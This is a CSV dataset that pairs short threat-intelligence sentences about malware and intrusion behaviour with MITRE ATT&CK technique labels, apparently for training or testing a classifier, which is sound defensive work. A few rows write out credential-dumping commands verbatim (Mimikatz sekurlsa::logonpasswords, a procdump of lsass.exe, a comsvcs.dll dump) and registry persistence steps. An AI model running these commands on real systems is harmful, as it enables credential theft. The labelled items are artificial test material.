text,label
has overwritten registry keys for persistence.,T1112
used a Trojan called KEYLIME to capture keystrokes from the victims machine.,T1056.001
can invoke Apple APIs contentsOfDirectoryAtPath pathExtension and (string) compare.,T1106
has used internal nodes on the compromised network for C2 communications.,T1090
has attempted to lure victims into clicking on malicious embedded archive files sent via spearphishing campaigns.,T1204.002
embedded payloads of one of the IronPython scripts.,T1027
has used Scheduled Tasks for persistence and to load and execute a reverse proxy binary.(Citation: CISA AA20-259A Iran-Based Actor September 2020),T1053.005
deobfuscated code of GuLoader’s shellcode.,T1140
has leveraged the BatchEncryption tool to perform advanced batch obfuscation and encoding techniques.,T1027
A new registry entry is created at HKEY_CURRENT_USERS\Software\Microsoft\Windows\CurrentVersion\Run\Graphics with a value of “C:\ ProgramData \ Initech \Initech.exe” /run.,T1547.001
uses cmd.exe to execute scripts and commands on the victims machine.,T1059.003
creates a Registry subkey that registers a new system device.,T1112
has disguised malicious programs as Google Chrome Adobe and VMware executables.,T1036.005
is capable of starting a process using CreateProcess.,T1106
whoami ,T1033
can deobfuscate strings and files for execution.,T1140
has been delivered within ZIP or RAR password-protected archived files.,T1027
has bypassed UAC.,T1548.002
During  stolen data was copied into a text file using the format `From <COMPUTER-NAME> (<Month>-<Day> <Hour>-<Minute>-<Second>).txt` prior to compression encoding and exfiltration.,T1074.001
has used custom packers to protect its payloads.,T1027
uses incoming HTTP requests with a username keyword and commands and handles them as instructions to perform actions.,T1071.001
established persistence using Registry Run keys both to execute PowerShell and VBS scripts as well as to execute their backdoor directly.(Citation: Cybereason Oceanlotus May 2017)(Citation: Cybereason Cobalt Kitty 2017),T1547.001
obtains a list of running processes.,T1057
tasklist was also used in order to enumerate processes on multiple hosts remotely,T1057
can delete itself from the compromised computer.,T1070.004
is capable of accessing locally stored passwords on victims.,T1552.001
the threat actors began to review sensitive documents,T1005
has relied on users to execute malicious file attachments delivered via spearphishing emails. ,T1204.002
encodes its second-stage payload with Base64. ,T1027
sends the logged-on username to its hard-coded C2.,T1033
has relied upon users clicking on a malicious attachment delivered through spearphishing.,T1204.002
can use the Linux API `if_nameindex` to gather network interface names.(Citation: NCSC Cyclops Blink February 2022),T1016
can enumerate drives on a compromised host.,T1082
During  the threat actors used `cmd.exe` to execute the wmiexec.vbs script.,T1059.003
contains the deletFileFromPath function to delete a specified file using the NSFileManager:removeFileAtPath method.,T1070.004
has been delivered through spearphishing emails.,T1566.001
"decrypting,",T1140
s JavaScript file used a legitimate Microsoft Office 2007 package to side-load the OINFO12.OCX dynamic link library.,T1574.002
can run a batch script named `del.bat` to remove any  payload-linked files from a compromise system if anti-analysis or locale checks fail.,T1070.004
can upload files and information from a compromised host to its C2 server.,T1041
wmic,T1047
can exfiltrate collected data via C2.,T1041
has a command to traverse the files and directories in a given path. ,T1083
by exploiting the following vulnerabilities against Microsoft Exchange servers,T1190
can use WMI to gather AV products installed on an infected host.,T1047
"the adversary also searches for VPN and firewall configs,",T1518.001
can fingerprint architecture computer name and OS version on the compromised host.  can also check if the Russian language is installed on the infected machine and terminate if it is found.(Citation: Cybereason Bazar July 2020),T1082
has created a scheduled task named Maintenance to establish persistence.,T1053.005
can collect the host IP address from the victims machine.,T1016
"The data above contains the hostname (‘HOSTNAME-PC’) of the victim machine, as well as an instruction",T1082
Threat actors used two scripts named s.bat (for servers) and w.bat,T1059.003
File deletion,T1070.004
can use MS10-061 to exploit a print spooler vulnerability in a remote system with a shared printer in order to move laterally.(Citation: Kaspersky Flame),T1210
has the ability to send information staged on a compromised host externally to C2.,T1041
Showing the Transfer of Cobalt Strike Beacons using RDPClip:,T1570
exploited a Windows SMB Remote Code Execution Vulnerability to conduct lateral movement.(Citation: FireEye APT28)(Citation: FireEye APT28 Hospitality Aug 2017),T1210
cmd /C,T1059.003
has used direct Windows system calls by leveraging Dumpert.,T1106
operators use Splashtop to transfer malicious tools from computer to computer in the victim’s environment.,T1570
"""cmd""  /c",T1059.003
has the ability to delete downloaded files from a compromised host.,T1070.004
has used the Windows service winmgmts:\\.\root\SecurityCenter2 to check installed antivirus products.,T1518.001
adds Registry Run keys to establish persistence.,T1547.001
has encrypted its C2 communications using XOR and VEST-32.,T1573.001
downloaded several staged items onto the victim's machine. ,T1105
has used various API calls as part of its checks to see if the malware is running in a sandbox.,T1106
has collected stolen files in a temporary folder in preparation for exfiltration.,T1074.001
the script executed by the threat actor was heavily obfuscated and encrypted the output using AES256.,T1027
"Each manager stores collected data in its own SQLite database, while data that is collected on demand is returned directly to the C&C server",T1074.001
used DLL sideloading to launch their malware,T1574.002
can deobfuscate shellcode using a rolling XOR and decrypt metadata from Beacon sessions.(Citation: Talos Cobalt Strike September 2020),T1140
has used WMI to execute binaries.,T1047
command and control commands are encrypted within the HTTP C2 channel using the DES algorithm in CBC mode with a key derived from the MD5 hash of the string HYF54&%9&jkMCXuiS.  will use an 8-byte XOR key derived from the string HYF54&%9&jkMCXuiS if the DES decoding fails,T1573.001
The JavaScript is heavily obfuscated. The first variable—a—is an array of obfuscated values,T1027
the threat actor used a compromised O365 administrator account,T1078
scrapes memory for properly formatted payment card data.(Citation: FireEye Fin8 May 2016),T1005
contains junk code to increase its entropy and hide the actual code.,T1027
File deletion functions,T1070.004
has used scheduled tasks to maintain persistence.,T1053.005
that makes the HTTP request.,T1071.001
During  threat actors used valid VPN credentials to gain initial access.,T1078
injects into the svchost.exe process.(Citation: S2 Grupo TrickBot June 2017)(Citation: Trend Micro Totbrick Oct 2016)(Citation: Microsoft Totbrick Oct 2017),T1055
The built-in Windows quser-command to show logged on users is also heavily used by them.,T1033
has the ability to capture keystrokes on an infected host.,T1056.001
execute embedded scripts,T1027
"After hijacking the aforementioned drivers, the rootkit erases the DLL names associated with them from internal structures used to display device drivers.",T1027
uses command-line interaction to search files and directories.(Citation: Mandiant Operation Ke3chang November 2014),T1083
has used e-mail to deliver malicious attachments to victims.,T1566.001
creates a Registry subkey that registers a new service.  also creates a Registry entry modifying the Logical Disk Manager service to point to a malicious DLL dropped to disk.,T1543.003
has collected the DNS address of the infected host.,T1016
has used WMI to discover network connections and configurations.  has also used the Win32_Process class to execute a malicious DLL.,T1047
has attempted to disable security software by creating a suspended process for the security software and injecting code to delete antivirus core files when the process is resumed.,T1562.001
has the ability to encrypt communications with D3DES.,T1573.001
the decrypted payload,T1140
the threat actor connected via Remote Desktop to a Domain Controller and copied the DSInternals10 PowerShell module to the system.,T1570
With the config decrypted,T1140
uses reg add to add a Registry Run key for persistence.,T1112
can stage stolen browser data in `C:\\Windows\\Temp\\cup.tmp` and keylogger data in `C:\\Windows\\Temp\\Report.06E17A5A-7325-4325-8E5D-E172EBA7FC5BK`.,T1074.001
After the strings are decrypted,T1140
collects the external IP address from the system. ,T1016
has been compressed and obfuscated using RC4 AES or XOR.,T1027
the obfuscation technique for the dropped files being hex-encoding vs. string concatenation,T1027
has relied upon a victim to click on a malicious email attachment.,T1204.002
logs the keystrokes on the targeted system.,T1056.001
"exploited Microsoft SharePoint servers in 2019 to gain code execution, probably by leveraging CVE-2019-0604",T1190
enumerates system services to search for ones relating to security,T1518.001
During  the threat actors collected the computer name OS and other system information using `cmd /c systeminfo > %temp%\ temp.ini`.,T1082
can decode encrypted strings to enable execution of commands and payloads.(Citation: G Data Sodinokibi June 2019)(Citation: Kaspersky Sodin July 2019)(Citation: Cylance Sodinokibi July 2019)(Citation: McAfee Sodinokibi October 2019)(Citation: Intel 471 REvil March 2020),T1140
can use Inveigh to conduct name service poisoning for credential theft and associated relay attacks.(Citation: Github PowerShell Empire),T1557.001
can obtain information about network parameters.,T1016
can encrypt strings with XOR-based routines and use a custom AES storage format for plugins configuration C2 domains and harvested data.(Citation: BlackBerry CostaRicto November 2020)(Citation: FireEye FiveHands April 2021),T1027
can capture the victim's screen.(Citation: McAfee Netwire Mar 2015)(Citation: FireEye NETWIRE March 2019)(Citation: Red Canary NETWIRE January 2020),T1113
is capable of performing screen captures.,T1113
has exploited ZeroLogon (CVE-2020-1472) against vulnerable domain controllers.,T1210
performs the tasklist command to list running processes.,T1057
has the ability to use  to list running processes.,T1057
can use a stream cipher to decrypt stings used by the malware.,T1140
This links the previous samples with this unique username,T1033
has the ability to identify the host volume ID and the OS architecture on a compromised host.,T1082
has the ability to identify the system volume information of a compromised host.,T1082
actors may misuse various content delivery networks (CDNs) to set up redirects of serving content to the content served by attacker-controlled C2 hosts.,T1090
can enumerate the IP address of a compromised host.,T1016
and only decrypted in memory when needed.,T1140
a reverse proxy tool for proxying an internal service,T1090
Python programs that are obfuscated using PyArmor,T1027
a method of lateral movement and a tool for downloading/executing files.,T1570
can obtain a list of directories.,T1083
adopted Cloudflare as a proxy for compromised servers.,T1090
"We suspect the attacker was trying to generate sympathy by reminding the reader that Munchon and the province it is in, Kangwon, were part of a unified province that included South Korea's Gangwon-do prior to the division of Korea in 1945.A second email contained a story about a person called 'Ewing Kim' who was looking for help:The email's attachments are two different HWP documents, both leveraging same vulnerability (CVE-2013-0808)",T1566.001
runs WMI queries every second to get all process creation and termination events.,T1047
ProcDump deletion from the ProgramData folder of all targeted workstations after dumping their LSASS process:,T1027
collects data in a plaintext file named r1.log before exfiltration. ,T1074.001
can collect the hostname operating system configuration product ID and disk space on victim machines by executing .,T1082
strings and the APIs used by,T1106
C2 traffic can communicate via TCP raw sockets.,T1095
"Though this is a very rigid method of hiding its codes,",T1027
has queued an APC routine to explorer.exe by calling ZwQueueApcThread.,T1055
can collect the computer name and OS version from a compromised host.,T1082
"It is unknown what these domains may have been used for but based on the similarity of domain spoofing and sharing an IP, they are likely part of the adversary infrastructure",T1016
"After running within the %TEMP% path, Comnie will delete the original file",T1070.004
has used  to move laterally between hosts in the target network.,T1570
has the ability to use Smart Applet attacks to disable the Java SecurityManager sandbox.(Citation: Talos Cobalt Strike September 2020),T1562.001
The  dropper can place malicious payloads on targeted systems.,T1105
has the ability to list drives and files on the compromised host.(Citation: TrendMicro BlackTech June 2017),T1083
can download and execute AdvancedRun.exe via `sc.exe`.(Citation: Medium S2W WhisperGate January 2022),T1569.002
uses scheduled tasks typically named Watchmon Service for persistence.,T1053.005
and the following data is written into registry:,T1112
has used a variety of Windows API calls including `GetComputerNameA` `GetUserNameA` and `CreateProcessA`.,T1106
has performed screen captures of victims including by using a tool scr.exe (which matched the hash of ScreenUtil).(Citation: US-CERT TA18-074A),T1113
has the ability to decode downloaded files prior to execution.,T1140
HTTP variant,T1071.001
batch file,T1059.003
has the ability to download files.,T1105
can obtain a list of processes on a compromised host.,T1057
has relied upon users clicking on a malicious attachment delivered through spearphishing.(Citation: Trend Micro Banking Malware Jan 2019)(Citation: Carbon Black Emotet Apr 2019),T1204.002
Keylogging,T1056.001
creates a backdoor through which remote attackers can retrieve system information.,T1082
Log in to O365 as a user with privileged access to cloud resources.,T1078
can use Native API including CreateProcess GetProcessById and WriteProcessMemory.,T1106
It collects a list of fixed drives but excludes the drive where the %WINDOWS% directory exists.,T1083
has used rundll32.exe to execute DLLs.,T1218.011
can inject malicious code into process created by the Command_Create&Inject function.,T1055
"The decrypted data consists of 4 bytes containing the payload size,",T1140
can run `C:\Windows\system32\cmd.exe /c cmd /c ipconfig /all 2>&1` to discover network settings.,T1016
An encrypted additional shellcode,T1027
has sent spearphishing attachments with password protected ZIP files.(Citation: Unit 42 Valak July 2020)(Citation: Unit 42 TA551 Jan 2021),T1566.001
can collect the user name from a compromised host.,T1033
can collect the TCP/IP DNS DHCP and network adapter configuration on a compromised host via ipconfig.exe /all.,T1016
has deleted the MSI file after installation.,T1070.004
can modify registry keys as part of setting a new pass-through authentication agent.,T1112
can inject itself into running processes on a compromised host.,T1055
is a Base64 encoded script with various components split into different variables for obfuscation purposes.,T1027
"Flash object in the .docx file, stored in uncompressed format The Flash object contains an ActionScript which is responsible for extracting the exploit using a custom packer seen in other FinSpy exploits",T1027
can deobfuscate XOR-encoded shellcode prior to execution.,T1140
RDP traffic,T1021.001
can hash then resolve API calls at runtime.(Citation: Cybereason Bazar July 2020),T1027
has captured victim computer name memory space and CPU details.,T1082
Captured data stored in the uploader C2,T1041
uses AES to encrypt network traffic. The key can be hardcoded or negotiated with the C2 server in the registration phase. ,T1573.001
leverages SOCKS5 proxies to hide malicious traffic,T1090
can use run keys and create link files in the startup folder for persistence.(Citation: IBM Grandoreiro April 2020),T1547.001
can collect the hostname Microsoft Windows version and processor architecture from a victim machine.,T1082
“cmd /c,T1059.003
has used junk code within their DLL files to hinder analysis.,T1027
has the ability to delete a specified file.,T1070.004
has been disguised as legitimate 360 Total Security Antivirus and OpenVPN programs. ,T1036.005
"infoClient is reponsible for collecting OS info, submitting this info to its C&C servers (the servers are malicious in nature), and receiving additional C&C communication information",T1082
server component is capable of opening a command terminal.(Citation: SecureWorks BRONZE UNION June 2017)(Citation: Lee 2013),T1059.003
malware gathers the registered user and primary owner name via WMI.,T1033
"After finding the process id, the shellcode uses standard functions to allocate and write memory within Explorer and then uses low-level API RtlCreateUserThread for thread injection.",T1055
stages data prior to exfiltration in multi-part archives often saved in the Recycle Bin.,T1074.001
fprii.net 185.130.212.254 Domain used for spear phish sender e-mail address and to host malicious documents,T1016
exfiltrated over HTTP using GET requests,T1071.001
has been packed with Themida.,T1027
then launched by cmd.exe,T1059.003
sent spearphishing emails containing malicious password-protected RAR attachments.(Citation: HackerNews IndigoZebra July 2021),T1566.001
has created new services and modified existing services for persistence.,T1543.003
actors deleted tools and batch files from victim systems.,T1070.004
has used a Registry Run key to establish persistence by executing JavaScript code within the rundll32.exe process.,T1547.001
can identify whether it has been run previously on a host by checking for a specified folder.,T1083
WMIC is a good tool for managing windows hosts and is widely favored by desktop administrators,T1047
obfuscates files by splitting strings into smaller sub-strings and including garbage strings that are never used. The malware also uses return-oriented programming (ROP) technique and single-byte XOR to obfuscate data.,T1027
"The toolset used by the Magic Hound campaign was an assortment of custom tools, as well as open sourced tools available to the general public",T1518.001
can decrypt password-protected executables.,T1140
"passed as an argument on the
command line.",T1059.003
can achieve persistence by copying its DLL to a subdirectory of %APPDATA% and creating a Visual Basic Script that will load the DLL via a scheduled task.(Citation: Proofpoint Bumblebee April 2022),T1053.005
can gather the username from the system.,T1033
checks for the existence of two configuration files (keyword_parm.txt and parm.txt) and attempts to read the files every 30 seconds.,T1083
downloader code has included 0 characters at the end of the file to inflate the file size in a likely attempt to evade anti-virus detection.(Citation: Secureworks BRONZE BUTLER Oct 2017),T1027
has the ability to enumerate processes.,T1057
Once the encoded payload has been located,T1027
This executable binary insecurely downloads and executes additional payloads from the Internet.,T1105
scanning files in a specified or generic path,T1083
proxy tools depending on their intended use.,T1090
uses HTTPS for command and control.,T1071.001
has the ability to set a Registry key to run a cmd.exe command.,T1059.003
"Custom tools such as REDTRIP, PINKTRIP, and BLUETRIP have also been used to create SOCKS5 proxies between infected hosts",T1090
has used the NtQueryDirectoryFile and ZwQueryDirectoryFile functions to hide files and directories.,T1106
"DHS and FBI recommend that network administrators review the IP addresses, file hashes, network signatures, and YARA rules provided, and add the IPs to their watchlist to determine whether malicious activity has been observed within their organization.When reviewing network perimeter logs for the IP addresses, organizations may find numerous instances of these IP addresses attempting to connect to their systems",T1016
The threat actors then executed Mimikatz on VDI-KMS to harvest credentials,T1003.001
has used side loading to place malicious DLLs in memory.,T1574.002
has been delivered as malicious email attachments. ,T1566.001
encodes the payload of system information sent to the command and control servers using a one byte 0xFF XOR key.  also uses a 31-byte long static byte string to XOR data sent to command and control servers. The servers use a different static key to encrypt replies to the implant. ,T1573.001
has encrypted C2 commands with AES-256. ,T1573.001
This function scans VM volumes on an ESXi server.,T1083
Add the process to a startup registry key,T1547.001
threat actors using Mimikatz in conjunction with coin miner protocols and software.,T1003.001
can identify the IP and MAC addresses of the compromised host.,T1016
has obfuscated their payloads through packing.,T1027
The first .CMD file set seen to use AutoIt in its execution,T1059.003
Additional data is gleaned via WMI queries,T1047
"that registers a scheduled task which runs immediately and upon user logon,",T1053.005
can delete files and directories.,T1070.004
service was installed in the system,T1543.003
"As shown in Figure 12, the script within the dupatechecker.doc file attempts to download another file named dupatechecker.exe from the same server",T1105
is heavily obfuscated and includes encrypted configuration files.,T1027
decrypts  which was stored in AES128-CBC encrypted blobs. ,T1140
Uses EnumWindows API,T1106
modifies an HKCU Registry key to store a session identifier unique to the compromised system as well as a pre-shared key used for encrypting and decrypting C2 communications.,T1112
for initial access is RDP compromise.,T1021.001
can collect information on user sessions.,T1033
obfuscates files or information to help evade defensive measures.,T1027
they are instructed to click “Confirm” to view a message from “Express.”,T1204.002
 has delivered spearphishing emails that contain a zipped file with malicious contents.(Citation: Securelist Machete Aug 2014)(Citation: ESET Machete July 2019),T1566.001
has used Tor relays for Command and Control servers.,T1090
"This information allows a threat actor to determine if their messages were delivered, which users are more susceptible to opening them, and basic information regarding the target’s operating system and e-mail client (or browser)",T1082
has the ability to list directories.,T1083
or password spraying.,T1110
has exploited CVE-2020-5902 an F5 BIP-IP vulnerability to drop a Linux backdoor.  has also exploited mis-configured Plesk servers.,T1190
"To establish persistent remote access on the victim device, the threat actor abused Windows services to install modified version of Cobalt Strike payload",T1543.003
has used AES for encryption of command and control traffic.,T1573.001
creates a scheduled task to maintain persistence on the victims machine.,T1053.005
has encrypted its payload with RC4.,T1027
has had null characters padded in its malicious DLL payload.,T1027
OS version information,T1082
has used raw sockets for network communication.,T1095
obfuscated shellcode used during execution.,T1027
It also allows macro code to access internal VBA objects for stealthier macro code execution in future attacks,T1140
can be used to delete files from the file system.,T1070.004
to load a binary into memory that injects,T1055
"All zero-day exploits known, or suspected, to have been used by this group are for vulnerabilities in Internet Explorer and Flash",T1068
"The user is also asked to permit push notifications in the browser,",T1204.002
has used a tool to open a Windows Command Shell on a remote host.,T1059.003
cmd.exe /C rundll32.exe,T1218.011
automatically searches for files on local drives based on a predefined list of file extensions.,T1083
The shellcode is not encrypted but is obfuscated,T1027
has modified UPX headers after packing files to break unpackers.,T1027
has used trojanized Microsoft Word documents sent via email which prompted the victim to enable macros.,T1204.002
has run tasklist on a victim's machine.,T1057
checks for specific registry keys related to the UCOMIEnumConnections and IActiveScriptParseProcedure32 interfaces.,T1012
task scheduling,T1053.005
script that downloads a file from a fixed location and executes it.,T1105
can launch an interface where it can execute several commands on the victims PC.,T1059.003
uses COM interfaces to schedule tasks,T1053.005
GPG decryption,T1140
can enumerate the hostname domain and IP of a compromised host.,T1082
contains an implementation of  to gather credentials from memory.,T1003.001
can search for processes with antivirus and antimalware product names.(Citation: Mcafee Clop Aug 2019),T1518.001
Injected Process Name,T1055
has used a custom JSON-based protocol for its C&C communications.,T1095
the raw disk driver was embedded inside the malware,T1027
has been packed using a dark market crypter.,T1027
can search for specific file extensions including zipped files.,T1083
has the ability to copy files and download/upload files into C2 channels using FTP and HTTPS.(Citation: Talos PoetRAT April 2020),T1105
"do rundll32.exe C:\windows\System32\comsvcs.dll,",T1218.011
Disabling this security control,T1562.001
has a command to transfer files from a remote host. ,T1105
can download files from remote servers.,T1105
has used  to query the Registry for installed programs.(Citation: TrendMicro Ursnif Mar 2015),T1012
has obfuscated strings with base64 encoding.,T1027
can be used to export events from a specific log.(Citation: Wevtutil Microsoft Documentation),T1005
encodes it using XOR encoding with key,T1027
can upload files over the C2 channel. ,T1041
has relied on victims clicking a malicious document for execution. ,T1204.002
creates a backdoor through which remote attackers can download files and additional malware components.(Citation: Symantec Trojan.Hydraq Jan 2010),T1105
has used compromised Office 365 service accounts with Global Administrator privileges to collect email from user inboxes.,T1078
is used to poison name services to gather hashes and credentials from systems within a local network.,T1557.001
code is protected and obfuscated,T1027
embedded the commands schtasks /Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I inside a batch script. ,T1053.005
The base64 encoding starts with JAB that is a common pattern for UTF-16 starting with $,T1027
The malware also decrypts,T1140
domain fronting appears to be used by threat actors.,T1090
deletes all files written to disk in the current working directory,T1070.004
This service executes a malicious binary (Cobalt Strike Cat payload) under “C:\Windows\Temp\svchost.exe” every time the victim device is started.,T1569.002
can initiate communication over HTTP/HTTPS for its C2 server.,T1071.001
the Windows payload was named “IntelUpdater.exe”,T1036.005
uses NetUser-GetInfo to identify that it is running under an Admin account on the local system.,T1033
renames one of its .dll files to uxtheme.dll in an apparent attempt to masquerade as a legitimate file.(Citation: FinFisher Citation),T1036.005
and a batch file 1.bat were dropped on the host and the batch file was executed,T1059.003
Full path to file and hidden files,T1564.001
Modifies the Windows registry,T1112
can use DirectoryList to enumerate files in a specified directory.,T1083
can obtain the victim username and permissions.,T1033
can check `Software\Microsoft\Windows\CurrentVersion\Internet Settings` to extract the `ProxyServer` string.,T1012
has used a fronted domain to obfuscate its hard-coded C2 server domain.,T1090
"20 New processes The malicious svchost constantly queries ieframe.dll, as well as IWebBrowser2 Interface using CLSID dc30c1661-cdaf-11D0-8A3E-00c04fc9e26e, both key components to interact with Internet Explorer",T1055
has gathered a recursive directory listing to find files and directories of interest.,T1083
The threat actor primarily focused on exploiting four different remote code execution (RCE) vulnerabilities to target web services,T1210
"they used yet another technique to dump LSASS on the beachhead host, this time using a built in Windows tool comsvcs.dll.",T1003.001
uses various XOR techniques to obfuscate its components.,T1027
discovers information about the infected machine.,T1082
can use HTTP for C2.,T1071.001
used  nodes for C2.,T1090
used HTTPS reverse proxies to redirect C2 traffic between target network and the team’s Cobalt Strike servers.,T1090
captures screenshots.(Citation: ESET Machete July 2019)(Citation: Securelist Machete Aug 2014)(Citation: Cylance Machete Mar 2017),T1113
has compromised third parties and used compromised accounts to send spearphishing emails with targeted attachments to recipients.(Citation: Unit 42 MuddyWater Nov 2017)(Citation: FireEye MuddyWater Mar 2018)(Citation: Securelist MuddyWater Oct 2018)(Citation: ClearSky MuddyWater June 2019)(Citation: Anomali Static Kitten February 2021)(Citation: Trend Micro Muddy Water March 2021),T1566.001
can use `cmd.exe` for execution.,T1059.003
has resolved the path of a process PID to use as a script argument.,T1083
can use the `LoadResource` and `CreateProcessW` APIs for execution.,T1106
"C:\Windows\system32\cmd.exe /C mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords""",T1003.001
contains various modules emulating other service execution tools such as .,T1569.002
can hide legitimate directories and replace them with malicious copies of the same name.,T1564.001
has the ability to inject malicious DLLs into a specific process for privilege escalation.,T1055
has used HTTP and HTTPS in communication with C2.(Citation: Cylance Sodinokibi July 2019)(Citation: Secureworks GandCrab and REvil September 2019)(Citation: McAfee Sodinokibi October 2019)(Citation: Intel 471 REvil March 2020),T1071.001
can use `rundll32.exe` for execution.,T1218.011
has used tools to take screenshots from victims.(Citation: ESET Sednit Part 2)(Citation: XAgentOSX 2017)(Citation: DOJ GRU Indictment Jul 2018),T1113
"This script called a combination of QueueUserAPC, GetCurrentThreadId, OpenThread, and VirtualAlloc",T1106
"to download next stage and execute it""",T1105
UAC Bypass via the CMSTPLUA COM interface,T1548.002
During  the threat actors enabled Wdigest by changing the `HKLM\SYSTEM\\ControlSet001\\Control\\SecurityProviders\\WDigest` registry value from 0 (disabled) to 1 (enabled).,T1112
contains the “whoami” command,T1033
service-based DLL implant traverses the FTP servers directories looking for files with keyword matches for computer names or certain keywords.,T1083
has decrypted strings and imports using RC4 during execution.(Citation: Securelist Darkhotel Aug 2015),T1140
has searched the Image File Execution Options registry key for Debugger within every subkey.,T1012
can detect system information--including disk names total space and remaining space--to create a hardware profile GUID which acts as a system identifier for operators.(Citation: Eset Ramsay May 2020),T1082
.]net via HTTP Get and POST metadata specified in the beacon's configuration.,T1071.001
has attempted to bypass UAC and gain elevated administrative privileges.,T1548.002
can enumerate Registry values keys and data.,T1012
has downloaded code from a C2 server.,T1105
has disabled Windows Defender to evade protections.,T1562.001
"After reestablishing access, the adversaries download tools such as gsecudmp and WCE that are staged temporarily on websites that TG-3390 previously compromised but never used",T1105
can download and launch additional payloads.(Citation: Talos Cobalt Group July 2018),T1105
"The attachment, if opened,",T1204.002
can download additional files from URLs.,T1105
Most of the PowerShell commands would call Windows Management Instrumentation (WMI),T1047
"to steal Outlook data such as server, user, and password from POP3, SMPT, and IMAP registry keys",T1012
lists the systems processes.(Citation: Lazarus RATANKBA),T1057
can download additional files onto a compromised host.,T1105
Run a shell command,T1059.003
has used tools including  to test internet connectivity from compromised hosts.,T1016
can use New-GPOImmediateTask to modify a GPO that will install and execute a malicious .,T1484.001
did RDP to a few other servers,T1021.001
used different compromised credentials for remote access and to move laterally.(Citation: FireEye SUNBURST Backdoor December 2020),T1078
can download files to the system.,T1105
parses the export tables of system DLLs to locate and call various Windows API functions.(Citation: SecureList SynAck Doppelgnging May 2018),T1106
has attempted to run Darkside ransomware with the filename sleep.exe.,T1036.005
full command line argument,T1059.003
has the ability to use TCP and UDP for communication.,T1095
retrieves the hard disk name by calling the CreateFileA to \\.\PHYSICALDRIVE0 API.,T1082
has used a custom encryption scheme for communication between scripts and pyminifier to obfuscate scripts.(Citation: Talos PoetRAT April 2020),T1027
has been delivered as malicious e-mail attachments.,T1566.001
"Process injections in svchost process via CreateRemoteThread, Default named pipes, etc",T1055
uses rundll32 to load various tools on victims including a lateral movement tool named Vminst Cobalt Strike and shellcode.,T1218.011
This beacon was then successfully executed via WMI,T1047
is capable of executing commands via .,T1059.003
the threat actor injected into various processes,T1055
The decryption function,T1140
persists by creating a Registry entry in HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\.,T1547.001
makes various native API calls.,T1106
"Invoke-Obfuscation calls the variable obfuscation technique used by the actors to obfuscate this script Random Case + {} + Ticks, which changes all variables in the script to have randomly cased characters, to be surrounded in curly braces and to include the tick (`) character, which is ignored in by PowerShell",T1027
has decoded malware components that are then dropped to the system.,T1140
has used a legitimate application to sideload a DLL to decrypt decompress and run a payload.(Citation: Unit42 Emissary Panda May 2019),T1574.002
can use valid credentials with  or wmic to spread itself to remote systems.(Citation: Talos Nyetya June 2017),T1078
PowerShell script can decode and decrypt multiple layers of obfuscation leading to the  DLL being loaded into memory.,T1140
The WinAPI CryptGenRandom is utilized,T1106
has used HTTP for C2 communications.(Citation: Unit 42 Bisonal July 2018),T1071.001
has sent malicious DOC and PDF files to targets so that they can be opened by a user.,T1204.002
"In the event this is successful, the malware will use the following path to store any dropped files:  %COMMONPROGRAMFILES%\services\  In the event it is not successful, this alternative path will be used instead:  %APPDATA%\microsoft\mmc\  Reaver.v2 proceeds to decrypt an embedded file using a simple XOR obfuscation routine",T1140
can execute a task to download a file.(Citation: ESET Gazer Aug 2017),T1105
The adversary copied those tools over SMB from compromised system to compromised system wherever they needed these tools.,T1570
C:\programdata\procdump64.exe -accepteula -ma lsass.exe C:\ProgramData\lsass.dmp,T1003.001
most likely using credentials gathered by the previous LSASS access.,T1003.001
Try to disable Tamper Protection settings of Windows Defender,T1562.001
has the ability to use bytecode to decrypt embedded payloads.,T1140
has stored a decoy PDF file within a victim's `%temp%` folder.,T1074.001
has the capability to exfiltrate stolen data to a hidden folder on a removable drive.,T1564.001
has the ability to hide and unhide files.,T1564.001
"exploited the Microsoft SharePoint vulnerability
CVE-2019-0604 to install web shells",T1190
uses Rundll32 to ensure only a single instance of itself is running at once.,T1218.011
has used scheduled tasks for persistence and execution.,T1053.005
HTTP/HTTPS C2 traffic,T1071.001
has used plugins with a self-delete capability.,T1070.004
used a tool called CLASSFON to covertly proxy network communications.,T1090
has a function for decrypting data containing C2 configuration information.,T1140
can enumerate running processes.,T1057
adds a new service named NetAdapter to establish persistence.,T1543.003
can gain persistence by a creating a shortcut in the infected user's Startup directory.,T1547.001
can delete files from victim machines.,T1070.004
has used an RC4-based encryption method for its C2 communications.,T1573.001
"the decrypted data matches
the payload",T1140
"injecting into multiple other processes, such as explorer.exe and svchost.exe, to execute further payloads.",T1055
